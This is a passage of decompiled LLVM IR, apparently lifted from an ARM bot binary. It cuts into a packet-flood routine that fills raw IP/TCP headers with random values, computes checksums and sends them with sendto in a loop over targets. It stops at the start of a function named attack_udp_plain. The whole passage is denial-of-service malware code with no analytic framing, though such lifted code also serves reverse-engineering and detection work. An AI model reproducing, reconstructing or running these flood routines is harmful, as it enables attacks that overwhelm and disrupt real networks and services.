  %v2_b328 = inttoptr i32 %v1_b328 to i8*
  %v3_b328 = load i8, i8* %v2_b328, align 1
  %v4_b328 = zext i8 %v3_b328 to i32
  store i32 %v1_b204, i32* %r3.global-to-local, align 4
  %v1_b330 = and i32 %v4_b328, 253
  %v4_b334 = or i32 %v1_b330, %v3_b334
  store i32 %v4_b334, i32* %r2.global-to-local, align 4
  %v1_b338 = trunc i32 %v4_b334 to i8
  store i8 %v1_b338, i8* %v2_b328, align 1
  %v0_b33c = load i32, i32* %r1.global-to-local, align 4
  %v1_b33c = add i32 %v0_b33c, 13
  %v2_b33c = inttoptr i32 %v1_b33c to i8*
  %v3_b33c = load i8, i8* %v2_b33c, align 1
  %v4_b33c = zext i8 %v3_b33c to i32
  store i32 %v1_b208, i32* %r0.global-to-local, align 4
  %v1_b344 = and i32 %v4_b33c, 254
  %v2_b348 = or i32 %v1_b344, %v1_b208
  store i32 %v2_b348, i32* %r3.global-to-local, align 4
  %v1_b34c = trunc i32 %v2_b348 to i8
  store i8 %v1_b34c, i8* %v2_b33c, align 1
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_b358 = load i32, i32* %r4.global-to-local, align 4
  %v3_b358 = add i32 %v2_b358, 40
  %v4_b358 = inttoptr i32 %v3_b358 to i8*
  store i8 2, i8* %v4_b358, align 1
  %v0_b35c = load i32, i32* %r2.global-to-local, align 4
  %v1_b35c = trunc i32 %v0_b35c to i8
  %v2_b35c = load i32, i32* %r4.global-to-local, align 4
  %v3_b35c = add i32 %v2_b35c, 41
  %v4_b35c = inttoptr i32 %v3_b35c to i8*
  store i8 %v1_b35c, i8* %v4_b35c, align 1
  %v0_b360 = call i32 @rand_next()
  %v1_b364 = urem i32 %v0_b360, 16
  %v1_b368 = or i32 %v1_b364, 1392
  %tmp66 = mul nuw nsw i32 %v1_b368, 256
  %v3_b374 = add nuw nsw i32 %tmp66, 2048
  %v1_b378 = and i32 %v3_b374, ptrtoint (i32* @global_var_ff00.33 to i32)
  %v5_b37c = or i32 %v1_b378, 5
  %v1_b380 = trunc i32 %v5_b37c to i16
  %v2_b380 = load i32, i32* %r4.global-to-local, align 4
  %v3_b380 = add i32 %v2_b380, 42
  %v4_b380 = inttoptr i32 %v3_b380 to i16*
  store i16 %v1_b380, i16* %v4_b380, align 2
  %v2_b388 = load i32, i32* %r4.global-to-local, align 4
  %v3_b388 = add i32 %v2_b388, 44
  %v4_b388 = inttoptr i32 %v3_b388 to i8*
  store i8 4, i8* %v4_b388, align 1
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_b398 = load i32, i32* %r4.global-to-local, align 4
  %v3_b398 = add i32 %v2_b398, 46
  %v4_b398 = inttoptr i32 %v3_b398 to i8*
  store i8 8, i8* %v4_b398, align 1
  %v0_b39c = load i32, i32* %r2.global-to-local, align 4
  %v1_b39c = trunc i32 %v0_b39c to i8
  %v2_b39c = load i32, i32* %r4.global-to-local, align 4
  %v3_b39c = add i32 %v2_b39c, 47
  %v4_b39c = inttoptr i32 %v3_b39c to i8*
  store i8 %v1_b39c, i8* %v4_b39c, align 1
  %v0_b3a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_b3a0 = trunc i32 %v0_b3a0 to i8
  %v2_b3a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3a0 = add i32 %v2_b3a0, 45
  %v4_b3a0 = inttoptr i32 %v3_b3a0 to i8*
  store i8 %v1_b3a0, i8* %v4_b3a0, align 1
  %v0_b3a4 = call i32 @rand_next()
  store i32 %v0_b3a4, i32* %r0.global-to-local, align 4
  %v2_b3ac = load i32, i32* %r4.global-to-local, align 4
  %v3_b3ac = add i32 %v2_b3ac, 59
  %v4_b3ac = inttoptr i32 %v3_b3ac to i8*
  store i8 6, i8* %v4_b3ac, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_b3bc = load i32, i32* %r4.global-to-local, align 4
  %v2_b3bc = add i32 %v1_b3bc, 48
  %v3_b3bc = inttoptr i32 %v2_b3bc to i32*
  store i32 %v0_b3a4, i32* %v3_b3bc, align 4
  %v0_b3c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b3c0 = load i32, i32* %r4.global-to-local, align 4
  %v2_b3c0 = add i32 %v1_b3c0, 52
  %v3_b3c0 = inttoptr i32 %v2_b3c0 to i32*
  store i32 %v0_b3c0, i32* %v3_b3c0, align 4
  %v0_b3c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b3c4 = trunc i32 %v0_b3c4 to i8
  %v2_b3c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3c4 = add i32 %v2_b3c4, 56
  %v4_b3c4 = inttoptr i32 %v3_b3c4 to i8*
  store i8 %v1_b3c4, i8* %v4_b3c4, align 1
  %v0_b3c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b3c8 = trunc i32 %v0_b3c8 to i8
  %v2_b3c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3c8 = add i32 %v2_b3c8, 58
  %v4_b3c8 = inttoptr i32 %v3_b3c8 to i8*
  store i8 %v1_b3c8, i8* %v4_b3c8, align 1
  %v0_b3cc = load i32, i32* %r1.global-to-local, align 4
  %v1_b3cc = trunc i32 %v0_b3cc to i8
  %v2_b3cc = load i32, i32* %r4.global-to-local, align 4
  %v3_b3cc = add i32 %v2_b3cc, 57
  %v4_b3cc = inttoptr i32 %v3_b3cc to i8*
  store i8 %v1_b3cc, i8* %v4_b3cc, align 1
  %v3_b3d0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b3d0, i32* %r3.global-to-local, align 4
  %v1_b3d4 = load i32, i32* %r2.global-to-local, align 4
  %v2_b3d4 = add i32 %v1_b3d4, %v3_b3d0
  store i32 %v2_b3d4, i32* @r4, align 4
  %v1_b3d8 = load i32, i32* @r7, align 4
  %v9_b3d8 = icmp eq i32 %v2_b3d4, %v1_b3d8
  store i1 %v9_b3d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_b3d4, i32* %stack_var_-44, align 4
  %v5_b3e0 = icmp slt i32 %v2_b3d4, %v1_b3d8
  br i1 %v5_b3e0, label %dec_label_pc_b228, label %dec_label_pc_b3e4.preheader

dec_label_pc_b3e4.preheader:                      ; preds = %bb61, %dec_label_pc_b158
  %v0_b3e86 = phi i32 [ 0, %dec_label_pc_b158 ], [ %v1_b3d8, %bb61 ]
  %v3_b560 = icmp eq i32 %v6_b10c, -1
  %v8_b560 = icmp eq i32 %v6_b10c, -1
  %v3_b430 = icmp eq i32 %v3_b174, 65535
  br label %dec_label_pc_b3e4

dec_label_pc_b3e4:                                ; preds = %dec_label_pc_b3e4, %dec_label_pc_b4f4, %dec_label_pc_b3e4.preheader
  %v0_b3e8 = phi i32 [ %v0_b3e86, %dec_label_pc_b3e4.preheader ], [ 0, %dec_label_pc_b4f4 ], [ 0, %dec_label_pc_b3e4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b3e8 = icmp eq i32 %v0_b3e8, 0
  store i1 %v2_b3e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b3e8, label %dec_label_pc_b3e4, label %dec_label_pc_b3f4

dec_label_pc_b3f4:                                ; preds = %dec_label_pc_b3e4, %dec_label_pc_b4f4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b3f8

dec_label_pc_b3f8:                                ; preds = %dec_label_pc_b470, %dec_label_pc_b3f4
  %v1_b408 = phi i32 [ %v1_b4e4, %dec_label_pc_b470 ], [ 0, %dec_label_pc_b3f4 ]
  %v5_b3fc = mul i32 %v1_b408, 24
  %v1_b400 = load i32, i32* @r8, align 4
  %v2_b400 = add i32 %v1_b400, %v5_b3fc
  store i32 %v2_b400, i32* %r3.global-to-local, align 4
  %v1_b404 = add i32 %v2_b400, 20
  %v2_b404 = inttoptr i32 %v1_b404 to i8*
  %v3_b404 = load i8, i8* %v2_b404, align 1
  %v4_b404 = zext i8 %v3_b404 to i32
  store i32 %v4_b404, i32* %r2.global-to-local, align 4
  %v0_b408 = load i32, i32* @sb, align 4
  %v4_b408 = mul i32 %v1_b408, 4
  %v5_b408 = add i32 %v0_b408, %v4_b408
  %v6_b408 = inttoptr i32 %v5_b408 to i32*
  %v7_b408 = load i32, i32* %v6_b408, align 4
  store i32 %v7_b408, i32* @r5, align 4
  %v7_b40c = icmp eq i8 %v3_b404, 31
  store i1 %v7_b40c, i1* %cpsr_z.global-to-local, align 1
  %v1_b410 = add i32 %v7_b408, 20
  store i32 %v1_b410, i32* @r6, align 4
  %tmp67 = icmp ult i8 %v3_b404, 32
  br i1 %tmp67, label %dec_label_pc_b508, label %dec_label_pc_b418

dec_label_pc_b418:                                ; preds = %dec_label_pc_b3f8
  store i32 %v6_b10c, i32* %r3.global-to-local, align 4
  store i1 %v8_b560, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_b560, label %dec_label_pc_b568, label %dec_label_pc_b424

dec_label_pc_b424:                                ; preds = %dec_label_pc_b508, %dec_label_pc_b418
  store i32 %v3_b174, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_b430, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b430, label %dec_label_pc_b584, label %dec_label_pc_b438

dec_label_pc_b438:                                ; preds = %dec_label_pc_b568, %dec_label_pc_b424
  %v1_b43c = phi i32 [ %v1_b578, %dec_label_pc_b568 ], [ 65535, %dec_label_pc_b424 ]
  store i32 %v3_b178, i32* %r1.global-to-local, align 4
  %v9_b43c = icmp eq i32 %v3_b178, %v1_b43c
  store i1 %v9_b43c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b43c, label %dec_label_pc_b598, label %dec_label_pc_b444

dec_label_pc_b444:                                ; preds = %dec_label_pc_b584.dec_label_pc_b444_crit_edge, %dec_label_pc_b438
  %v1_b448 = phi i32 [ %v1_b448.pre, %dec_label_pc_b584.dec_label_pc_b444_crit_edge ], [ %v1_b43c, %dec_label_pc_b438 ]
  store i32 %v3_b17c, i32* %r2.global-to-local, align 4
  %v9_b448 = icmp eq i32 %v3_b17c, %v1_b448
  store i1 %v9_b448, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b448, label %dec_label_pc_b5ac, label %dec_label_pc_b450

dec_label_pc_b450:                                ; preds = %dec_label_pc_b598.dec_label_pc_b450_crit_edge, %dec_label_pc_b444
  %v1_b454 = phi i32 [ %v1_b454.pre, %dec_label_pc_b598.dec_label_pc_b450_crit_edge ], [ %v1_b448, %dec_label_pc_b444 ]
  store i32 %v6_b048, i32* %r3.global-to-local, align 4
  %v9_b454 = icmp eq i32 %v6_b048, %v1_b454
  store i1 %v9_b454, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b454, label %dec_label_pc_b5c0, label %dec_label_pc_b45c

dec_label_pc_b45c:                                ; preds = %dec_label_pc_b5ac.dec_label_pc_b45c_crit_edge, %dec_label_pc_b450
  %v1_b460 = phi i32 [ %v1_b460.pre, %dec_label_pc_b5ac.dec_label_pc_b45c_crit_edge ], [ %v1_b454, %dec_label_pc_b450 ]
  store i32 %v6_b060, i32* %r0.global-to-local, align 4
  %v9_b460 = icmp eq i32 %v6_b060, %v1_b460
  store i1 %v9_b460, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b460, label %dec_label_pc_b5d4, label %dec_label_pc_b468

dec_label_pc_b468:                                ; preds = %dec_label_pc_b5c0, %dec_label_pc_b45c
  %v0_b468 = load i32, i32* @fp, align 4
  %v2_b468 = icmp eq i32 %v0_b468, 0
  store i1 %v2_b468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b468, label %dec_label_pc_b470, label %dec_label_pc_b5e4

dec_label_pc_b470:                                ; preds = %dec_label_pc_b468, %dec_label_pc_b5d4, %dec_label_pc_b5e4
  %v2_b474 = load i32, i32* @r5, align 4
  %v3_b474 = add i32 %v2_b474, 10
  %v4_b474 = inttoptr i32 %v3_b474 to i16*
  store i16 0, i16* %v4_b474, align 2
  %v0_b478 = load i32, i32* @r5, align 4
  store i32 %v0_b478, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_b480 = call i32 @checksum_generic(i32 %v0_b478, i32 20)
  %v3_b480 = trunc i32 %v2_b480 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b488 = load i32, i32* @r5, align 4
  %v4_b488 = add i32 %v3_b488, 10
  %v5_b488 = inttoptr i32 %v4_b488 to i16*
  store i16 %v3_b480, i16* %v5_b488, align 2
  %v0_b48c = load i32, i32* @r6, align 4
  store i32 %v0_b48c, i32* @r1, align 4
  %v0_b490 = load i32, i32* %r2.global-to-local, align 4
  %v1_b490 = trunc i32 %v0_b490 to i16
  %v3_b490 = add i32 %v0_b48c, 16
  %v4_b490 = inttoptr i32 %v3_b490 to i16*
  store i16 %v1_b490, i16* %v4_b490, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_b49c = load i32, i32* @r5, align 4
  store i32 %v0_b49c, i32* %r0.global-to-local, align 4
  %v4_b4a0 = call i32 @checksum_tcpudp(i32 %v0_b49c, i32 %v0_b48c, i32 10240, i32 40)
  %v5_b4a0 = trunc i32 %v4_b4a0 to i16
  store i32 %v4_b4a0, i32* %r0.global-to-local, align 4
  %v3_b4a4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b4a4, i32* %r3.global-to-local, align 4
  %v3_b4a8 = mul i32 %v3_b4a4, 32
  store i32 %v3_b4a8, i32* %lr.global-to-local, align 4
  %v3_b4ac = load i32, i32* @r6, align 4
  %v4_b4ac = add i32 %v3_b4ac, 16
  %v5_b4ac = inttoptr i32 %v4_b4ac to i16*
  store i16 %v5_b4a0, i16* %v5_b4ac, align 2
  %v0_b4b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_b4b0 = load i32, i32* %r3.global-to-local, align 4
  %tmp68 = mul i32 %v1_b4b0, -8
  %v5_b4b0 = add i32 %v0_b4b0, %tmp68
  store i32 %v5_b4b0, i32* %lr.global-to-local, align 4
  %v0_b4b4 = load i32, i32* @r6, align 4
  %v1_b4b4 = add i32 %v0_b4b4, 2
  %v2_b4b4 = inttoptr i32 %v1_b4b4 to i16*
  %v3_b4b4 = load i16, i16* %v2_b4b4, align 2
  %v4_b4b4 = zext i16 %v3_b4b4 to i32
  store i32 %v4_b4b4, i32* @r6, align 4
  %v1_b4b8 = load i32, i32* @r8, align 4
  %v2_b4b8 = add i32 %v1_b4b8, %v5_b4b0
  store i32 %v2_b4b8, i32* @lr, align 4
  %v3_b4bc = add i32 %v2_b4b8, 2
  %v4_b4bc = inttoptr i32 %v3_b4bc to i16*
  store i16 %v3_b4b4, i16* %v4_b4bc, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b4c8 = load i32, i32* @r5, align 4
  store i32 %v0_b4c8, i32* %r1.global-to-local, align 4
  %v0_b4cc = load i32, i32* @sl, align 4
  store i32 %v0_b4cc, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_b4d4 = load i32, i32* @lr, align 4
  %v6_b4dc = call i32 @__libc_sendto(i32 %v0_b4cc, i32 %v0_b4c8, i32 60, i32 16384, i32 %v0_b4d4, i32 16)
  %v3_b4e0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b4e0, i32* %r3.global-to-local, align 4
  %v1_b4e4 = add i32 %v3_b4e0, 1
  store i32 %v1_b4e4, i32* %r0.global-to-local, align 4
  %v1_b4e8 = load i32, i32* @r7, align 4
  %v9_b4e8 = icmp eq i32 %v1_b4e4, %v1_b4e8
  store i1 %v9_b4e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b4e4, i32* %stack_var_-44, align 4
  %v5_b4f0 = icmp slt i32 %v1_b4e4, %v1_b4e8
  br i1 %v5_b4f0, label %dec_label_pc_b3f8, label %dec_label_pc_b4f4

dec_label_pc_b4f4:                                ; preds = %dec_label_pc_b470
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b4f8 = icmp eq i32 %v1_b4e8, 0
  store i1 %v2_b4f8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b4f8, label %dec_label_pc_b3e4, label %dec_label_pc_b3f4

dec_label_pc_b508:                                ; preds = %dec_label_pc_b3f8
  %v1_b508 = add i32 %v2_b400, 16
  %v2_b508 = inttoptr i32 %v1_b508 to i32*
  %v3_b508 = load i32, i32* %v2_b508, align 4
  store i32 %v3_b508, i32* %r4.global-to-local, align 4
  %v0_b50c = call i32 @rand_next()
  store i32 %v0_b50c, i32* %r0.global-to-local, align 4
  %v3_b510 = load i32, i32* %stack_var_-44, align 4
  %v5_b518 = mul i32 %v3_b510, 24
  %v0_b51c = load i32, i32* %r4.global-to-local, align 4
  %v1_b51c = and i32 %v0_b51c, 16711680
  %v3_b520 = udiv i32 %v0_b51c, 16777216
  %v4_b524 = udiv i32 %v1_b51c, 256
  %v5_b524 = or i32 %v4_b524, %v3_b520
  store i32 %v5_b524, i32* %r2.global-to-local, align 4
  %v1_b528 = load i32, i32* @r8, align 4
  %v2_b528 = add i32 %v1_b528, %v5_b518
  store i32 %v2_b528, i32* %r1.global-to-local, align 4
  %v1_b52c = and i32 %v0_b51c, ptrtoint (i32* @global_var_ff00.33 to i32)
  store i32 %v1_b52c, i32* %r3.global-to-local, align 4
  %v1_b530 = add i32 %v2_b528, 20
  %v2_b530 = inttoptr i32 %v1_b530 to i8*
  %v3_b530 = load i8, i8* %v2_b530, align 1
  %v4_b530 = zext i8 %v3_b530 to i32
  %v4_b534 = mul i32 %v1_b52c, 256
  %v4_b538 = mul i32 %v0_b51c, 16777216
  %v5_b534 = or i32 %v4_b534, %v4_b538
  %v5_b538 = or i32 %v5_b534, %v5_b524
  %v7_b53c = lshr i32 %v0_b50c, %v4_b530
  %v8_b53c = add i32 %v7_b53c, %v5_b538
  store i32 %v8_b53c, i32* %r2.global-to-local, align 4
  %v1_b540 = and i32 %v8_b53c, 16711680
  store i32 %v1_b540, i32* %r0.global-to-local, align 4
  %v1_b54c = and i32 %v8_b53c, 65280
  store i32 %v1_b54c, i32* %r1.global-to-local, align 4
  %v5_b554 = call i32 @llvm.bswap.i32(i32 %v8_b53c)
  %v1_b558 = load i32, i32* @r5, align 4
  %v2_b558 = add i32 %v1_b558, 16
  %v3_b558 = inttoptr i32 %v2_b558 to i32*
  store i32 %v5_b554, i32* %v3_b558, align 4
  store i32 %v6_b10c, i32* %r3.global-to-local, align 4
  store i1 %v8_b560, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b560, label %dec_label_pc_b568, label %dec_label_pc_b424

dec_label_pc_b568:                                ; preds = %dec_label_pc_b508, %dec_label_pc_b418
  %v0_b568 = call i32 @rand_next()
  store i32 65536, i32* %r4.global-to-local, align 4
  %v1_b570 = load i32, i32* @r5, align 4
  %v2_b570 = add i32 %v1_b570, 12
  %v3_b570 = inttoptr i32 %v2_b570 to i32*
  store i32 %v0_b568, i32* %v3_b570, align 4
  store i32 %v3_b174, i32* %r0.global-to-local, align 4
  %v0_b578 = load i32, i32* %r4.global-to-local, align 4
  %v1_b578 = add i32 %v0_b578, -1
  store i32 %v1_b578, i32* @r4, align 4
  %v9_b57c = icmp eq i32 %v3_b174, %v1_b578
  store i1 %v9_b57c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b57c, label %dec_label_pc_b584, label %dec_label_pc_b438

dec_label_pc_b584:                                ; preds = %dec_label_pc_b568, %dec_label_pc_b424
  %v0_b584 = call i32 @rand_next()
  %v1_b584 = trunc i32 %v0_b584 to i16
  store i32 %v0_b584, i32* %r0.global-to-local, align 4
  store i32 %v3_b178, i32* %r1.global-to-local, align 4
  %v1_b58c = load i32, i32* @r4, align 4
  %v9_b58c = icmp eq i32 %v3_b178, %v1_b58c
  store i1 %v9_b58c, i1* %cpsr_z.global-to-local, align 1
  %v3_b590 = load i32, i32* @r5, align 4
  %v4_b590 = add i32 %v3_b590, 4
  %v5_b590 = inttoptr i32 %v4_b590 to i16*
  store i16 %v1_b584, i16* %v5_b590, align 2
  br i1 %v9_b58c, label %dec_label_pc_b598, label %dec_label_pc_b584.dec_label_pc_b444_crit_edge

dec_label_pc_b584.dec_label_pc_b444_crit_edge:    ; preds = %dec_label_pc_b584
  %v1_b448.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b444

dec_label_pc_b598:                                ; preds = %dec_label_pc_b584, %dec_label_pc_b438
  %v0_b598 = call i32 @rand_next()
  %v1_b598 = trunc i32 %v0_b598 to i16
  store i32 %v0_b598, i32* %r0.global-to-local, align 4
  store i32 %v3_b17c, i32* %r2.global-to-local, align 4
  %v1_b5a0 = load i32, i32* @r4, align 4
  %v9_b5a0 = icmp eq i32 %v3_b17c, %v1_b5a0
  store i1 %v9_b5a0, i1* %cpsr_z.global-to-local, align 1
  %v3_b5a4 = load i32, i32* @r5, align 4
  %v4_b5a4 = add i32 %v3_b5a4, 20
  %v5_b5a4 = inttoptr i32 %v4_b5a4 to i16*
  store i16 %v1_b598, i16* %v5_b5a4, align 2
  br i1 %v9_b5a0, label %dec_label_pc_b5ac, label %dec_label_pc_b598.dec_label_pc_b450_crit_edge

dec_label_pc_b598.dec_label_pc_b450_crit_edge:    ; preds = %dec_label_pc_b598
  %v1_b454.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b450

dec_label_pc_b5ac:                                ; preds = %dec_label_pc_b598, %dec_label_pc_b444
  %v0_b5ac = call i32 @rand_next()
  %v1_b5ac = trunc i32 %v0_b5ac to i16
  store i32 %v0_b5ac, i32* %r0.global-to-local, align 4
  store i32 %v6_b048, i32* %r3.global-to-local, align 4
  %v1_b5b4 = load i32, i32* @r4, align 4
  %v9_b5b4 = icmp eq i32 %v6_b048, %v1_b5b4
  store i1 %v9_b5b4, i1* %cpsr_z.global-to-local, align 1
  %v3_b5b8 = load i32, i32* @r6, align 4
  %v4_b5b8 = add i32 %v3_b5b8, 2
  %v5_b5b8 = inttoptr i32 %v4_b5b8 to i16*
  store i16 %v1_b5ac, i16* %v5_b5b8, align 2
  br i1 %v9_b5b4, label %dec_label_pc_b5c0, label %dec_label_pc_b5ac.dec_label_pc_b45c_crit_edge

dec_label_pc_b5ac.dec_label_pc_b45c_crit_edge:    ; preds = %dec_label_pc_b5ac
  %v1_b460.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b45c

dec_label_pc_b5c0:                                ; preds = %dec_label_pc_b5ac, %dec_label_pc_b450
  %v0_b5c0 = call i32 @rand_next()
  %v1_b5c4 = load i32, i32* @r6, align 4
  %v2_b5c4 = add i32 %v1_b5c4, 4
  %v3_b5c4 = inttoptr i32 %v2_b5c4 to i32*
  store i32 %v0_b5c0, i32* %v3_b5c4, align 4
  store i32 %v6_b060, i32* %r0.global-to-local, align 4
  %v1_b5cc = load i32, i32* @r4, align 4
  %v9_b5cc = icmp eq i32 %v6_b060, %v1_b5cc
  store i1 %v9_b5cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b5cc, label %dec_label_pc_b5d4, label %dec_label_pc_b468

dec_label_pc_b5d4:                                ; preds = %dec_label_pc_b5c0, %dec_label_pc_b45c
  %v0_b5d4 = call i32 @rand_next()
  store i32 %v0_b5d4, i32* %r0.global-to-local, align 4
  %v0_b5d8 = load i32, i32* @fp, align 4
  %v2_b5d8 = icmp eq i32 %v0_b5d8, 0
  store i1 %v2_b5d8, i1* %cpsr_z.global-to-local, align 1
  %v1_b5dc = load i32, i32* @r6, align 4
  %v2_b5dc = add i32 %v1_b5dc, 8
  %v3_b5dc = inttoptr i32 %v2_b5dc to i32*
  store i32 %v0_b5d4, i32* %v3_b5dc, align 4
  br i1 %v2_b5d8, label %dec_label_pc_b470, label %dec_label_pc_b5e4

dec_label_pc_b5e4:                                ; preds = %dec_label_pc_b468, %dec_label_pc_b5d4
  %v0_b5e4 = call i32 @rand_next()
  %v1_b5e4 = trunc i32 %v0_b5e4 to i16
  store i32 %v0_b5e4, i32* %r0.global-to-local, align 4
  %v3_b5e8 = load i32, i32* @r6, align 4
  %v4_b5e8 = add i32 %v3_b5e8, 18
  %v5_b5e8 = inttoptr i32 %v4_b5e8 to i16*
  store i16 %v1_b5e4, i16* %v5_b5e8, align 2
  br label %dec_label_pc_b470

dec_label_pc_b5f0:                                ; preds = %dec_label_pc_b130
  %v0_b5f0 = load i32, i32* @sl, align 4
  store i32 %v0_b5f0, i32* %r0.global-to-local, align 4
  %v1_b5f4 = call i32 @__GI___libc_close(i32 %v0_b5f0)
  store i32 %v1_b5f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b5f8

dec_label_pc_b5f8:                                ; preds = %entry, %dec_label_pc_b5f0
  %v1_b600 = phi i32 [ %v3_b120, %entry ], [ %v1_b5f4, %dec_label_pc_b5f0 ]
  store i32 %v3_af5c, i32* %r4.global-to-local, align 4
  store i32 %v24_af5c, i32* %fp.global-to-local, align 4
  store i32 %v27_af5c, i32* %lr.global-to-local, align 4
  ret i32 %v1_b600

; uselistorder directives
  uselistorder i32 %v0_b5e4, { 1, 0 }
  uselistorder i32 %v0_b5ac, { 1, 0 }
  uselistorder i32 %v0_b598, { 1, 0 }
  uselistorder i32 %v0_b584, { 1, 0 }
  uselistorder i32 %v1_b578, { 1, 2, 0 }
  uselistorder i32 %v0_b51c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_b4e4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_b4b0, { 1, 0 }
  uselistorder i32 %v4_b4a0, { 1, 0 }
  uselistorder i1 %v3_b430, { 1, 0 }
  uselistorder i32 %v2_b3d4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b23c, { 1, 2, 0 }
  uselistorder i32 %v1_b208, { 2, 1, 0 }
  uselistorder i32 %v1_b204, { 2, 0, 1 }
  uselistorder i32 %v1_b200, { 2, 0, 1 }
  uselistorder i32 %v1_b1fc, { 2, 0, 1 }
  uselistorder i32 %v1_b1d8, { 1, 0 }
  uselistorder i32 %v3_b174, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_b168, { 1, 0, 2 }
  uselistorder i32 %v0_b164, { 1, 0, 3, 2 }
  uselistorder i1 %v7_b150, { 1, 0 }
  uselistorder i1 %v7_b124, { 1, 0 }
  uselistorder i32 %v3_b120, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_b10c, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v6_b060, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v6_b048, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_afd4, { 1, 0 }
  uselistorder i32 %v6_afcc, { 1, 0 }
  uselistorder i32 %v7_afb4, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 39, 38, 41, 40, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 5, 4, 6, 8, 9, 7, 10, 12, 11, 13, 15, 14, 16, 17, 18, 21, 19, 20, 22, 23, 24, 25, 26, 27, 28, 32, 29, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b5f8, { 1, 0 }
  uselistorder label %dec_label_pc_b5e4, { 1, 0 }
  uselistorder label %dec_label_pc_b470, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b3f4, { 1, 0 }
  uselistorder label %dec_label_pc_b3e4, { 1, 0, 2 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
}

define i32 @attack_udp_plain(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_b608 = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_b624 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_b624, i32* @sl, align 4
  %v0_b630 = load i32, i32* @r7, align 4
  %v2_b634 = call i32 @calloc(i32 %v0_b630, i32 4)
